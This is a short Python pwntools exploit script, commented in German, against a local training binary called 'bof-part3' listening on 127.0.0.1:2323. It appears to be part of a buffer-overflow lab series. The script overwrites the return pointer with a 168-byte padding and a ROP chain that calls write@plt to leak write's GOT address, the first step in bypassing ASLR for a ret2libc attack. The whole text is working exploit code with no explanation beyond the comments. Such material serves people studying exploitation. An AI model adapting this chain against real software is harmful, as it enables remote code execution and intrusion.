#!/usr/bin/env python

from pwn import *

pop3ret    = 0x40116a                # Unser pop rdi; pop rsi; pop rdx; ret; gadget
bin=ELF("./bof-part3")

s=remote("127.0.0.1",2323)
s.recvuntil(b": ")

buf = b"A"*168                        # RIP Offset
buf += p64(pop3ret)                   # POP Argumente
buf += p64(constants.STDOUT_FILENO)   # stdout
buf += p64(bin.got[b'write'])         # lese von write@got
buf += p64(0x8)                       # schreibe 8 bytes in stdout
buf += p64(bin.plt[b'write'])         # Rückkehr nach write@plt
buf += b'EOPAY'                       # Ende des Payloads


print("[+] send payload")
s.send(buf)                           # buf überschreibt RIP
s.recvuntil(b'EOPAY')                 # Empfange Daten bis EOPAY
print("[+] recvd \'EOPAY\'")

got_leak=u64(s.recv(8))
print("[+] leaked write address: {}".format(hex(got_leak)))